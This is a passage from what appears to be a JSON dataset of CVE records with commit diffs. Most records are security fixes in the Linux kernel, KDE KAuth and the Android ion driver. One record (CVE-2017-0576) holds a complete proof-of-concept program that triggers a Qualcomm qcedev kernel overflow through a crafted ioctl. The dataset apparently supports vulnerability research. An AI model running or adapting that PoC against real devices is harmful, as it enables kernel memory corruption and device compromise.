X86EMUL_CONTINUE)\n \t\treturn rc;\n \t\/* Outer-privilege level return is not implemented *\/\n \tif (ctxt->mode >= X86EMUL_MODE_PROT16 && (cs & 3) > cpl)\n \t\treturn X86EMUL_UNHANDLEABLE;\n-\trc = load_segment_descriptor(ctxt, (u16)cs, VCPU_SREG_CS);\n+\trc = __load_segment_descriptor(ctxt, (u16)cs, VCPU_SREG_CS, 0, false,\n+\t\t\t\t       &new_desc);\n+\tif (rc != X86EMUL_CONTINUE)\n+\t\treturn rc;\n+\trc = assign_eip_far(ctxt, eip, new_desc.l);\n+\tif (rc != X86EMUL_CONTINUE) {\n+\t\tWARN_ON(!ctxt->mode != X86EMUL_MODE_PROT64);\n+\t\tops->set_segment(ctxt, old_cs, &old_desc, 0, VCPU_SREG_CS);\n+\t}\n \treturn rc;\n }\n \n@@ -2505,19 +2536,24 @@ static int load_state_from_tss16(struct x86_emulate_ctxt *ctxt,\n \t * Now load segment descriptors. If fault happens at this stage\n \t * it is handled in a context of new task\n \t *\/\n-\tret = __load_segment_descriptor(ctxt, tss->ldt, VCPU_SREG_LDTR, cpl, true);\n+\tret = __load_segment_descriptor(ctxt, tss->ldt, VCPU_SREG_LDTR, cpl,\n+\t\t\t\t\ttrue, NULL);\n \tif (ret != X86EMUL_CONTINUE)\n \t\treturn ret;\n-\tret = __load_segment_descriptor(ctxt, tss->es, VCPU_SREG_ES, cpl, true);\n+\tret = __load_segment_descriptor(ctxt, tss->es, VCPU_SREG_ES, cpl,\n+\t\t\t\t\ttrue, NULL);\n \tif (ret != X86EMUL_CONTINUE)\n \t\treturn ret;\n-\tret = __load_segment_descriptor(ctxt, tss->cs, VCPU_SREG_CS, cpl, true);\n+\tret = __load_segment_descriptor(ctxt, tss->cs, VCPU_SREG_CS, cpl,\n+\t\t\t\t\ttrue, NULL);\n \tif (ret != X86EMUL_CONTINUE)\n \t\treturn ret;\n-\tret = __load_segment_descriptor(ctxt, tss->ss, VCPU_SREG_SS, cpl, true);\n+\tret = __load_segment_descriptor(ctxt, tss->ss, VCPU_SREG_SS, cpl,\n+\t\t\t\t\ttrue, NULL);\n \tif (ret != X86EMUL_CONTINUE)\n \t\treturn ret;\n-\tret = __load_segment_descriptor(ctxt, tss->ds, VCPU_SREG_DS, cpl, true);\n+\tret = __load_segment_descriptor(ctxt, tss->ds, VCPU_SREG_DS, cpl,\n+\t\t\t\t\ttrue, NULL);\n \tif (ret != X86EMUL_CONTINUE)\n \t\treturn ret;\n \n@@ -2642,25 +2678,32 @@ static int load_state_from_tss32(struct x86_emulate_ctxt *ctxt,\n \t * Now load segment descriptors. If fault happenes at this stage\n \t * it is handled in a context of new task\n \t *\/\n-\tret = __load_segment_descriptor(ctxt, tss->ldt_selector, VCPU_SREG_LDTR, cpl, true);\n+\tret = __load_segment_descriptor(ctxt, tss->ldt_selector, VCPU_SREG_LDTR,\n+\t\t\t\t\tcpl, true, NULL);\n \tif (ret != X86EMUL_CONTINUE)\n \t\treturn ret;\n-\tret = __load_segment_descriptor(ctxt, tss->es, VCPU_SREG_ES, cpl, true);\n+\tret = __load_segment_descriptor(ctxt, tss->es, VCPU_SREG_ES, cpl,\n+\t\t\t\t\ttrue, NULL);\n \tif (ret != X86EMUL_CONTINUE)\n \t\treturn ret;\n-\tret = __load_segment_descriptor(ctxt, tss->cs, VCPU_SREG_CS, cpl, true);\n+\tret = __load_segment_descriptor(ctxt, tss->cs, VCPU_SREG_CS, cpl,\n+\t\t\t\t\ttrue, NULL);\n \tif (ret != X86EMUL_CONTINUE)\n \t\treturn ret;\n-\tret = __load_segment_descriptor(ctxt, tss->ss, VCPU_SREG_SS, cpl, true);\n+\tret = __load_segment_descriptor(ctxt, tss->ss, VCPU_SREG_SS, cpl,\n+\t\t\t\t\ttrue, NULL);\n \tif (ret != X86EMUL_CONTINUE)\n \t\treturn ret;\n-\tret = __load_segment_descriptor(ctxt, tss->ds, VCPU_SREG_DS, cpl, true);\n+\tret = __load_segment_descriptor(ctxt, tss->ds, VCPU_SREG_DS, cpl,\n+\t\t\t\t\ttrue, NULL);\n \tif (ret != X86EMUL_CONTINUE)\n \t\treturn ret;\n-\tret = __load_segment_descriptor(ctxt, tss->fs, VCPU_SREG_FS, cpl, true);\n+\tret = __load_segment_descriptor(ctxt, tss->fs, VCPU_SREG_FS, cpl,\n+\t\t\t\t\ttrue, NULL);\n \tif (ret != X86EMUL_CONTINUE)\n \t\treturn ret;\n-\tret = __load_segment_descriptor(ctxt, tss->gs, VCPU_SREG_GS, cpl, true);\n+\tret = __load_segment_descriptor(ctxt, tss->gs, VCPU_SREG_GS, cpl,\n+\t\t\t\t\ttrue, NULL);\n \tif (ret != X86EMUL_CONTINUE)\n \t\treturn ret;\n \n@@ -2942,24 +2985,39 @@ static int em_call_far(struct x86_emulate_ctxt *ctxt)\n \tu16 sel, old_cs;\n \tulong old_eip;\n \tint rc;\n+\tstruct desc_struct old_desc, new_desc;\n+\tconst struct x86_emulate_ops *ops = ctxt->ops;\n+\tint cpl = ctxt->ops->cpl(ctxt);\n \n-\told_cs = get_segment_selector(ctxt, VCPU_SREG_CS);\n \told_eip = ctxt->_eip;\n+\tops->get_segment(ctxt, &old_cs, &old_desc, NULL, VCPU_SREG_CS);\n \n \tmemcpy(&sel, ctxt->src.valptr + ctxt->op_bytes, 2);\n-\tif (load_segment_descriptor(ctxt, sel, VCPU_SREG_CS))\n+\trc = __load_segment_descriptor(ctxt, sel, VCPU_SREG_CS, cpl, false,\n+\t\t\t\t       &new_desc);\n+\tif (rc != X86EMUL_CONTINUE)\n \t\treturn X86EMUL_CONTINUE;\n \n-\tctxt->_eip = 0;\n-\tmemcpy(&ctxt->_eip, ctxt->src.valptr, ctxt->op_bytes);\n+\trc = assign_eip_far(ctxt, ctxt->src.val, new_desc.l);\n+\tif (rc != X86EMUL_CONTINUE)\n+\t\tgoto fail;\n \n \tctxt->src.val = old_cs;\n \trc = em_push(ctxt);\n \tif (rc != X86EMUL_CONTINUE)\n-\t\treturn rc;\n+\t\tgoto fail;\n \n \tctxt->src.val = old_eip;\n-\treturn em_push(ctxt);\n+\trc = em_push(ctxt);\n+\t\/* If we failed, we tainted the memory, but the very least we should\n+\t   restore cs *\/\n+\tif (rc != X86EMUL_CONTINUE)\n+\t\tgoto fail;\n+\treturn rc;\n+fail:\n+\tops->set_segment(ctxt, old_cs, &old_desc, 0, VCPU_SREG_CS);\n+\treturn rc;\n+\n }\n \n static int em_ret_near_imm(struct x86_emulate_ctxt *ctxt)\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2017-0576","CWE_ID":"264","category":"security","commit_id":"0dd1a733e60cf5239c0a185d4219ba2ef1118a8b","commit_message":"From 0dd1a733e60cf5239c0a185d4219ba2ef1118a8b Mon Sep 17 00:00:00 2001\nFrom: derrek <derrek.haxx@yahoo.com>\nDate: Mon, 3 Apr 2017 20:54:04 +0200\nSubject: [PATCH] =?UTF-8?q?CVE-2017-0576=20Android=20Security=20Bulletin?=\n =?UTF-8?q?=E2=80=94April=202017?=\nMIME-Version: 1.0\nContent-Type: text\/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\n---\n ...\/qcom_qcedev_byteoffset_overflow.c         | 160 ++++++++++++++++++\n 1 file changed, 160 insertions(+)\n create mode 100644 CVE-2017-0576\/qcom_qcedev_byteoffset_overflow.c\n\n","diff_code":"diff --git a\/CVE-2017-0576\/qcom_qcedev_byteoffset_overflow.c b\/CVE-2017-0576\/qcom_qcedev_byteoffset_overflow.c\nnew file mode 100644\nindex 0000000..13121a2\n--- \/dev\/null\n+++ b\/CVE-2017-0576\/qcom_qcedev_byteoffset_overflow.c\n@@ -0,0 +1,160 @@\n+#include <stdlib.h>\n+#include <stdio.h>\n+#include <unistd.h>\n+#include <sys\/ioctl.h>\n+#include <sys\/types.h>\n+#include <sys\/stat.h>\n+#include <sys\/mman.h>\n+#include <fcntl.h>\n+#include <limits.h>\n+#include <inttypes.h>\n+\n+\n+\/*\n+ * PoC By Scott Bauer\n+ * Bug found by derrek\n+ *\/\n+\n+\n+static const char *dev = \"\/dev\/qce\";\n+\n+#define QCEDEV_MAX_KEY_SIZE     64\n+#define QCEDEV_MAX_IV_SIZE      32\n+#define QCEDEV_MAX_BUFFERS      16\n+\n+\n+struct  buf_info {\n+        union {\n+                uint32_t        offset;\n+                uint8_t         *vaddr;\n+        };\n+        uint32_t        len;\n+};\n+struct  qcedev_vbuf_info {\n+        struct buf_info src[QCEDEV_MAX_BUFFERS];\n+        struct buf_info dst[QCEDEV_MAX_BUFFERS];\n+};\n+\n+struct  qcedev_pmem_info {\n+        int             fd_src;\n+        struct buf_info src[QCEDEV_MAX_BUFFERS];\n+        int             fd_dst;\n+        struct buf_info dst[QCEDEV_MAX_BUFFERS];\n+};\n+\n+enum qcedev_oper_enum {\n+        QCEDEV_OPER_DEC         = 0,\n+        QCEDEV_OPER_ENC         = 1,\n+        QCEDEV_OPER_DEC_NO_KEY  = 2,\n+        QCEDEV_OPER_ENC_NO_KEY  = 3,\n+        QCEDEV_OPER_LAST\n+};\n+\n+enum qcedev_cipher_alg_enum {\n+        QCEDEV_ALG_DES          = 0,\n+        QCEDEV_ALG_3DES         = 1,\n+        QCEDEV_ALG_AES          = 2,\n+        QCEDEV_ALG_LAST\n+};\n+\n+enum qcedev_cipher_mode_enum {\n+        QCEDEV_AES_MODE_CBC     = 0,\n+        QCEDEV_AES_MODE_ECB     = 1,\n+        QCEDEV_AES_MODE_CTR     = 2,\n+        QCEDEV_AES_MODE_XTS     = 3,\n+        QCEDEV_AES_MODE_CCM     = 4,\n+        QCEDEV_DES_MODE_CBC     = 5,\n+        QCEDEV_DES_MODE_ECB     = 6,\n+        QCEDEV_AES_DES_MODE_LAST\n+};\n+\n+struct  qcedev_cipher_op_req {\n+        uint8_t                         use_pmem;\n+        union {\n+                struct qcedev_pmem_info pmem;\n+                struct qcedev_vbuf_info vbuf;\n+        };\n+        uint32_t                        entries;\n+        uint32_t                        data_len;\n+        uint8_t                         in_place_op;\n+        uint8_t                         enckey[QCEDEV_MAX_KEY_SIZE];\n+        uint32_t                        encklen;\n+        uint8_t                         iv[QCEDEV_MAX_IV_SIZE];\n+        uint32_t                        ivlen;\n+        uint32_t                        byteoffset;\n+        enum qcedev_cipher_alg_enum     alg;\n+        enum qcedev_cipher_mode_enum    mode;\n+        enum qcedev_oper_enum           op;\n+};\n+\n+#define QCEDEV_IOC_MAGIC        0x87\n+\n+#define QCEDEV_IOCTL_ENC_REQ            \\\n+        _IOWR(QCEDEV_IOC_MAGIC, 1, struct qcedev_cipher_op_req)\n+#define QCEDEV_IOCTL_DEC_REQ            \\\n+        _IOWR(QCEDEV_IOC_MAGIC, 2, struct qcedev_cipher_op_req)\n+\n+\n+\n+void thread_func(unsigned int start, unsigned int end, int fd)\n+{\n+\tstruct qcedev_cipher_op_req req = { 0 };\n+\tunsigned int i;\n+\tchar *data;\n+\n+\tdata = mmap(NULL, 0xFFFFFF * 3, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);\n+\tif (data == MAP_FAILED) {\n+\t\tprintf(\"mmap failed, get a better phone\\n\");\n+\t\texit(0);\n+\t}\n+\tfor (i = 0; i < 0xFFFFFF * 3; i += sizeof(void*))\n+\t\t*((unsigned long *)(data + i)) = 0xABADACC355001337;\n+\n+\n+\treq.in_place_op = 1;\n+\t\/* setup the parameters to pass a few sanity checks *\/\n+\treq.entries = 2;\n+\treq.byteoffset = 15;\n+\treq.mode = QCEDEV_AES_MODE_CTR;\n+\n+\treq.op = QCEDEV_OPER_ENC;\/\/_NO_KEY;\n+\treq.ivlen = 1;\n+\treq.data_len = 0xFFFFFFFE;\n+\treq.vbuf.src[0].len = 4;\n+\treq.vbuf.src[1].len = 0xFFFFFFFE - 4;\n+\treq.vbuf.src[0].vaddr = (uint8_t*)data;\n+\treq.vbuf.src[1].vaddr = (uint8_t*)data;\n+\treq.vbuf.dst[0].len = 4;\n+\treq.vbuf.dst[1].len = 0xFFFFFFFE - 4;\n+\treq.vbuf.dst[0].vaddr = (uint8_t*)data;\n+\treq.vbuf.dst[1].vaddr = (uint8_t*)data;\n+\n+\t\n+\tioctl(fd, QCEDEV_IOCTL_ENC_REQ, &req);\n+\n+\tprintf(\"exiting\\n\");\n+\texit(0);\n+}\n+\n+int main(void)\n+{\n+\tint fd;\n+\tunsigned int i;\n+\tunsigned int start = 0;\n+\tunsigned int _gap = ~0;\n+\tunsigned int gap = _gap \/ 8;\n+\tstruct qcedev_cipher_op_req req = { 0 };\n+\t\/\/char data[32] = { A };\n+\tchar *data;\n+\tfd = open(dev, O_RDWR);\n+\tif (fd < 0) {\n+\t\tprintf(\"Failed to open %s with errno %s\\n\", dev,\n+\t\t       strerror(errno));\n+\t\treturn EXIT_FAILURE;\n+\n+\t}\n+\tthread_func(start, start + gap, fd);\n+\n+\tsleep(1000000);\n+\treturn EXIT_FAILURE;\n+}\n","owner":"derrekr","repo":"android_security","source":"cve"},{"CVE_ID":"CVE-2013-1958","CWE_ID":"264","category":"security","commit_id":"92f28d973cce45ef5823209aab3138eb45d8b349","commit_message":"From 92f28d973cce45ef5823209aab3138eb45d8b349 Mon Sep 17 00:00:00 2001\nFrom: \"Eric W. Biederman\" <ebiederm@xmission.com>\nDate: Fri, 15 Mar 2013 01:03:33 -0700\nSubject: [PATCH] scm: Require CAP_SYS_ADMIN over the current pidns to spoof\n pids.\n\nDon't allow spoofing pids over unix domain sockets in the corner\ncases where a user has created a user namespace but has not yet\ncreated a pid namespace.\n\nCc: stable@vger.kernel.org\nReported-by: Andy Lutomirski <luto@amacapital.net>\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>\n---\n net\/core\/scm.c | 4 +++-\n 1 file changed, 3 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/net\/core\/scm.c b\/net\/core\/scm.c\nindex 905dcc6ad1e3b..2dc6cdaaae8ab 100644\n--- a\/net\/core\/scm.c\n+++ b\/net\/core\/scm.c\n@@ -24,6 +24,7 @@\n #include <linux\/interrupt.h>\n #include <linux\/netdevice.h>\n #include <linux\/security.h>\n+#include <linux\/pid_namespace.h>\n #include <linux\/pid.h>\n #include <linux\/nsproxy.h>\n #include <linux\/slab.h>\n@@ -52,7 +53,8 @@ static __inline__ int scm_check_creds(struct ucred *creds)\n \tif (!uid_valid(uid) || !gid_valid(gid))\n \t\treturn -EINVAL;\n \n-\tif ((creds->pid == task_tgid_vnr(current) || nsown_capable(CAP_SYS_ADMIN)) &&\n+\tif ((creds->pid == task_tgid_vnr(current) ||\n+\t     ns_capable(current->nsproxy->pid_ns->user_ns, CAP_SYS_ADMIN)) &&\n \t    ((uid_eq(uid, cred->uid)   || uid_eq(uid, cred->euid) ||\n \t      uid_eq(uid, cred->suid)) || nsown_capable(CAP_SETUID)) &&\n \t    ((gid_eq(gid, cred->gid)   || gid_eq(gid, cred->egid) ||\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2017-8422","CWE_ID":"264","category":"security","commit_id":"264e97625abe2e0334f97de17f6ffb52582888ab","commit_message":"From 264e97625abe2e0334f97de17f6ffb52582888ab Mon Sep 17 00:00:00 2001\nFrom: Albert Astals Cid <aacid@kde.org>\nDate: Wed, 10 May 2017 10:06:07 +0200\nSubject: Verify that whoever is calling us is actually who he says he is\n\nCVE-2017-8422\n---\n kdecore\/auth\/AuthBackend.cpp                       |  5 ++++\n kdecore\/auth\/AuthBackend.h                         |  7 ++++++\n kdecore\/auth\/backends\/dbus\/DBusHelperProxy.cpp     | 27 ++++++++++++++++++++--\n kdecore\/auth\/backends\/dbus\/DBusHelperProxy.h       |  6 ++++-\n ...\/auth\/backends\/policykit\/PolicyKitBackend.cpp   |  5 ++++\n kdecore\/auth\/backends\/policykit\/PolicyKitBackend.h |  1 +\n kdecore\/auth\/backends\/polkit-1\/Polkit1Backend.cpp  |  5 ++++\n kdecore\/auth\/backends\/polkit-1\/Polkit1Backend.h    |  1 +\n 8 files changed, 54 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/kdecore\/auth\/AuthBackend.cpp b\/kdecore\/auth\/AuthBackend.cpp\nindex c953b81..0ba4650 100644\n--- a\/kdecore\/auth\/AuthBackend.cpp\n+++ b\/kdecore\/auth\/AuthBackend.cpp\n@@ -54,6 +54,11 @@ void AuthBackend::setCapabilities(AuthBackend::Capabilities capabilities)\n     d->capabilities = capabilities;\n }\n \n+AuthBackend::ExtraCallerIDVerificationMethod AuthBackend::extraCallerIDVerificationMethod() const\n+{\n+    return NoExtraCallerIDVerificationMethod;\n+}\n+\n bool AuthBackend::actionExists(const QString& action)\n {\n     Q_UNUSED(action);\ndiff --git a\/kdecore\/auth\/AuthBackend.h b\/kdecore\/auth\/AuthBackend.h\nindex a86732e..6f4b1bc 100644\n--- a\/kdecore\/auth\/AuthBackend.h\n+++ b\/kdecore\/auth\/AuthBackend.h\n@@ -43,6 +43,12 @@ public:\n     };\n     Q_DECLARE_FLAGS(Capabilities, Capability)\n \n+    enum ExtraCallerIDVerificationMethod {\n+        NoExtraCallerIDVerificationMethod,\n+        VerifyAgainstDBusServiceName,\n+        VerifyAgainstDBusServicePid,\n+    };\n+\n     AuthBackend();\n     virtual ~AuthBackend();\n     virtual void setupAction(const QString &action) = 0;\n@@ -50,6 +56,7 @@ public:\n     virtual Action::AuthStatus authorizeAction(const QString &action) = 0;\n     virtual Action::AuthStatus actionStatus(const QString &action) = 0;\n     virtual QByteArray callerID() const = 0;\n+    virtual ExtraCallerIDVerificationMethod extraCallerIDVerificationMethod() const;\n     virtual bool isCallerAuthorized(const QString &action, QByteArray callerID) = 0;\n     virtual bool actionExists(const QString &action);\n \ndiff --git a\/kdecore\/auth\/backends\/dbus\/DBusHelperProxy.cpp b\/kdecore\/auth\/backends\/dbus\/DBusHelperProxy.cpp\nindex 9557a0f..ca59f1c 100644\n--- a\/kdecore\/auth\/backends\/dbus\/DBusHelperProxy.cpp\n+++ b\/kdecore\/auth\/backends\/dbus\/DBusHelperProxy.cpp\n@@ -271,6 +271,29 @@ void DBusHelperProxy::performActions(QByteArray blob, const QByteArray &callerID\n     }\n }\n \n+bool DBusHelperProxy::isCallerAuthorized(const QString &action, const QByteArray &callerID)\n+{\n+    \/\/ Check the caller is really who it says it is\n+    switch (BackendsManager::authBackend()->extraCallerIDVerificationMethod()) {\n+        case AuthBackend::NoExtraCallerIDVerificationMethod:\n+        break;\n+\n+        case AuthBackend::VerifyAgainstDBusServiceName:\n+            if (message().service().toUtf8() != callerID) {\n+                return false;\n+            }\n+        break;\n+\n+        case AuthBackend::VerifyAgainstDBusServicePid:\n+            if (connection().interface()->servicePid(message().service()).value() != callerID.toUInt()) {\n+                return false;\n+            }\n+        break;\n+    }\n+\n+    return BackendsManager::authBackend()->isCallerAuthorized(action, callerID);\n+}\n+\n QByteArray DBusHelperProxy::performAction(const QString &action, const QByteArray &callerID, QByteArray arguments)\n {\n     if (!responder) {\n@@ -295,7 +318,7 @@ QByteArray DBusHelperProxy::performAction(const QString &action, const QByteArra\n     QTimer *timer = responder->property(\"__KAuth_Helper_Shutdown_Timer\").value<QTimer*>();\n     timer->stop();\n \n-    if (BackendsManager::authBackend()->isCallerAuthorized(action, callerID)) {\n+    if (isCallerAuthorized(action, callerID)) {\n         QString slotname = action;\n         if (slotname.startsWith(m_name + QLatin1Char('.'))) {\n             slotname = slotname.right(slotname.length() - m_name.length() - 1);\n@@ -338,7 +361,7 @@ uint DBusHelperProxy::authorizeAction(const QString& action, const QByteArray& c\n     QTimer *timer = responder->property(\"__KAuth_Helper_Shutdown_Timer\").value<QTimer*>();\n     timer->stop();\n \n-    if (BackendsManager::authBackend()->isCallerAuthorized(action, callerID)) {\n+    if (isCallerAuthorized(action, callerID)) {\n         retVal = static_cast<uint>(Action::Authorized);\n     } else {\n         retVal = static_cast<uint>(Action::Denied);\ndiff --git a\/kdecore\/auth\/backends\/dbus\/DBusHelperProxy.h b\/kdecore\/auth\/backends\/dbus\/DBusHelperProxy.h\nindex 455cf51..264f6cc 100644\n--- a\/kdecore\/auth\/backends\/dbus\/DBusHelperProxy.h\n+++ b\/kdecore\/auth\/backends\/dbus\/DBusHelperProxy.h\n@@ -21,6 +21,7 @@\n #ifndef DBUS_HELPER_PROXY_H\n #define DBUS_HELPER_PROXY_H\n \n+#include <QDBusContext>\n #include <QVariant>\n #include \"HelperProxy.h\"\n #include \"kauthactionreply.h\"\n@@ -28,7 +29,7 @@\n namespace KAuth\n {\n \n-class DBusHelperProxy : public HelperProxy\n+class DBusHelperProxy : public HelperProxy, protected QDBusContext\n {\n     Q_OBJECT\n     Q_INTERFACES(KAuth::HelperProxy)\n@@ -73,6 +74,9 @@ signals:\n \n private slots:\n     void remoteSignalReceived(int type, const QString &action, QByteArray blob);\n+\n+private:\n+    bool isCallerAuthorized(const QString &action, const QByteArray &callerID);\n };\n \n } \/\/ namespace Auth\ndiff --git a\/kdecore\/auth\/backends\/policykit\/PolicyKitBackend.cpp b\/kdecore\/auth\/backends\/policykit\/PolicyKitBackend.cpp\nindex 3be97f2..9d041d1 100644\n--- a\/kdecore\/auth\/backends\/policykit\/PolicyKitBackend.cpp\n+++ b\/kdecore\/auth\/backends\/policykit\/PolicyKitBackend.cpp\n@@ -78,6 +78,11 @@ QByteArray PolicyKitBackend::callerID() const\n     return a;\n }\n \n+AuthBackend::ExtraCallerIDVerificationMethod Polkit1Backend::extraCallerIDVerificationMethod() const\n+{\n+    return VerifyAgainstDBusServicePid;\n+}\n+\n bool PolicyKitBackend::isCallerAuthorized(const QString &action, QByteArray callerID)\n {\n     QDataStream s(&callerID, QIODevice::ReadOnly);\ndiff --git a\/kdecore\/auth\/backends\/policykit\/PolicyKitBackend.h b\/kdecore\/auth\/backends\/policykit\/PolicyKitBackend.h\nindex 7154e93..0d3d8f9 100644\n--- a\/kdecore\/auth\/backends\/policykit\/PolicyKitBackend.h\n+++ b\/kdecore\/auth\/backends\/policykit\/PolicyKitBackend.h\n@@ -40,6 +40,7 @@ public:\n     virtual Action::AuthStatus authorizeAction(const QString&);\n     virtual Action::AuthStatus actionStatus(const QString&);\n     virtual QByteArray callerID() const;\n+    virtual ExtraCallerIDVerificationMethod extraCallerIDVerificationMethod() const;\n     virtual bool isCallerAuthorized(const QString &action, QByteArray callerID);\n \n private Q_SLOTS:\ndiff --git a\/kdecore\/auth\/backends\/polkit-1\/Polkit1Backend.cpp b\/kdecore\/auth\/backends\/polkit-1\/Polkit1Backend.cpp\nindex 732d2cb..63c0e1e 100644\n--- a\/kdecore\/auth\/backends\/polkit-1\/Polkit1Backend.cpp\n+++ b\/kdecore\/auth\/backends\/polkit-1\/Polkit1Backend.cpp\n@@ -163,6 +163,11 @@ QByteArray Polkit1Backend::callerID() const\n     return QDBusConnection::systemBus().baseService().toUtf8();\n }\n \n+AuthBackend::ExtraCallerIDVerificationMethod Polkit1Backend::extraCallerIDVerificationMethod() const\n+{\n+    return VerifyAgainstDBusServiceName;\n+}\n+\n bool Polkit1Backend::isCallerAuthorized(const QString &action, QByteArray callerID)\n {\n     PolkitQt1::SystemBusNameSubject subject(QString::fromUtf8(callerID));\ndiff --git a\/kdecore\/auth\/backends\/polkit-1\/Polkit1Backend.h b\/kdecore\/auth\/backends\/polkit-1\/Polkit1Backend.h\nindex 18ed1a2..d579da2 100644\n--- a\/kdecore\/auth\/backends\/polkit-1\/Polkit1Backend.h\n+++ b\/kdecore\/auth\/backends\/polkit-1\/Polkit1Backend.h\n@@ -48,6 +48,7 @@ public:\n     virtual Action::AuthStatus authorizeAction(const QString&);\n     virtual Action::AuthStatus actionStatus(const QString&);\n     virtual QByteArray callerID() const;\n+    virtual ExtraCallerIDVerificationMethod extraCallerIDVerificationMethod() const;\n     virtual bool isCallerAuthorized(const QString &action, QByteArray callerID);\n     virtual bool actionExists(const QString& action);\n \n-- \ncgit v1.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2016-9120","CWE_ID":"264","category":"security","commit_id":"9590232bb4f4cc824f3425a6e1349afbe6d6d2b7","commit_message":"From 9590232bb4f4cc824f3425a6e1349afbe6d6d2b7 Mon Sep 17 00:00:00 2001\nFrom: EunTaik Lee <eun.taik.lee@samsung.com>\nDate: Wed, 24 Feb 2016 04:38:06 +0000\nSubject: staging\/android\/ion : fix a race condition in the ion driver\n\nThere is a use-after-free problem in the ion driver.\nThis is caused by a race condition in the ion_ioctl()\nfunction.\n\nA handle has ref count of 1 and two tasks on different\ncpus calls ION_IOC_FREE simultaneously.\n\ncpu 0                                   cpu 1\n-------------------------------------------------------\nion_handle_get_by_id()\n(ref == 2)\n                            ion_handle_get_by_id()\n                            (ref == 3)\n\nion_free()\n(ref == 2)\n\nion_handle_put()\n(ref == 1)\n\n                            ion_free()\n                            (ref == 0 so ion_handle_destroy() is\n                            called\n                            and the handle is freed.)\n\n                            ion_handle_put() is called and it\n                            decreases the slub's next free pointer\n\nThe problem is detected as an unaligned access in the\nspin lock functions since it uses load exclusive\n instruction. In some cases it corrupts the slub's\nfree pointer which causes a mis-aligned access to the\nnext free pointer.(kmalloc returns a pointer like\nffffc0745b4580aa). And it causes lots of other\nhard-to-debug problems.\n\nThis symptom is caused since the first member in the\nion_handle structure is the reference count and the\nion driver decrements the reference after it has been\nfreed.\n\nTo fix this problem client->lock mutex is extended\nto protect all the codes that uses the handle.\n\nSigned-off-by: Eun Taik Lee <eun.taik.lee@samsung.com>\nReviewed-by: Laura Abbott <labbott@redhat.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\n---\n drivers\/staging\/android\/ion\/ion.c | 55 ++++++++++++++++++++++++++++++---------\n 1 file changed, 42 insertions(+), 13 deletions(-)\n mode change 100644 => 100755 drivers\/staging\/android\/ion\/ion.c\n\n","diff_code":"diff --git a\/drivers\/staging\/android\/ion\/ion.c b\/drivers\/staging\/android\/ion\/ion.c\nold mode 100644\nnew mode 100755\nindex 7ff2a7ec871f..33b390e7ea31\n--- a\/drivers\/staging\/android\/ion\/ion.c\n+++ b\/drivers\/staging\/android\/ion\/ion.c\n@@ -387,13 +387,22 @@ static void ion_handle_get(struct ion_handle *handle)\n \tkref_get(&handle->ref);\n }\n \n-static int ion_handle_put(struct ion_handle *handle)\n+static int ion_handle_put_nolock(struct ion_handle *handle)\n+{\n+\tint ret;\n+\n+\tret = kref_put(&handle->ref, ion_handle_destroy);\n+\n+\treturn ret;\n+}\n+\n+int ion_handle_put(struct ion_handle *handle)\n {\n \tstruct ion_client *client = handle->client;\n \tint ret;\n \n \tmutex_lock(&client->lock);\n-\tret = kref_put(&handle->ref, ion_handle_destroy);\n+\tret = ion_handle_put_nolock(handle);\n \tmutex_unlock(&client->lock);\n \n \treturn ret;\n@@ -417,20 +426,30 @@ static struct ion_handle *ion_handle_lookup(struct ion_client *client,\n \treturn ERR_PTR(-EINVAL);\n }\n \n-static struct ion_handle *ion_handle_get_by_id(struct ion_client *client,\n+static struct ion_handle *ion_handle_get_by_id_nolock(struct ion_client *client,\n \t\t\t\t\t\tint id)\n {\n \tstruct ion_handle *handle;\n \n-\tmutex_lock(&client->lock);\n \thandle = idr_find(&client->idr, id);\n \tif (handle)\n \t\tion_handle_get(handle);\n-\tmutex_unlock(&client->lock);\n \n \treturn handle ? handle : ERR_PTR(-EINVAL);\n }\n \n+struct ion_handle *ion_handle_get_by_id(struct ion_client *client,\n+\t\t\t\t\t\tint id)\n+{\n+\tstruct ion_handle *handle;\n+\n+\tmutex_lock(&client->lock);\n+\thandle = ion_handle_get_by_id_nolock(client, id);\n+\tmutex_unlock(&client->lock);\n+\n+\treturn handle;\n+}\n+\n static bool ion_handle_validate(struct ion_client *client,\n \t\t\t\tstruct ion_handle *handle)\n {\n@@ -532,22 +551,28 @@ struct ion_handle *ion_alloc(struct ion_client *client, size_t len,\n }\n EXPORT_SYMBOL(ion_alloc);\n \n-void ion_free(struct ion_client *client, struct ion_handle *handle)\n+static void ion_free_nolock(struct ion_client *client, struct ion_handle *handle)\n {\n \tbool valid_handle;\n \n \tBUG_ON(client != handle->client);\n \n-\tmutex_lock(&client->lock);\n \tvalid_handle = ion_handle_validate(client, handle);\n \n \tif (!valid_handle) {\n \t\tWARN(1, \"%s: invalid handle passed to free.\\n\", __func__);\n-\t\tmutex_unlock(&client->lock);\n \t\treturn;\n \t}\n+\tion_handle_put_nolock(handle);\n+}\n+\n+void ion_free(struct ion_client *client, struct ion_handle *handle)\n+{\n+\tBUG_ON(client != handle->client);\n+\n+\tmutex_lock(&client->lock);\n+\tion_free_nolock(client, handle);\n \tmutex_unlock(&client->lock);\n-\tion_handle_put(handle);\n }\n EXPORT_SYMBOL(ion_free);\n \n@@ -1332,11 +1357,15 @@ static long ion_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)\n \t{\n \t\tstruct ion_handle *handle;\n \n-\t\thandle = ion_handle_get_by_id(client, data.handle.handle);\n-\t\tif (IS_ERR(handle))\n+\t\tmutex_lock(&client->lock);\n+\t\thandle = ion_handle_get_by_id_nolock(client, data.handle.handle);\n+\t\tif (IS_ERR(handle)) {\n+\t\t\tmutex_unlock(&client->lock);\n \t\t\treturn PTR_ERR(handle);\n-\t\tion_free(client, handle);\n-\t\tion_handle_put(handle);\n+\t\t}\n+\t\tion_free_nolock(client, handle);\n+\t\tion_handle_put_nolock(handle);\n+\t\tmutex_unlock(&client->lock);\n \t\tbreak;\n \t}\n \tcase ION_IOC_SHARE:\n-- \ncgit 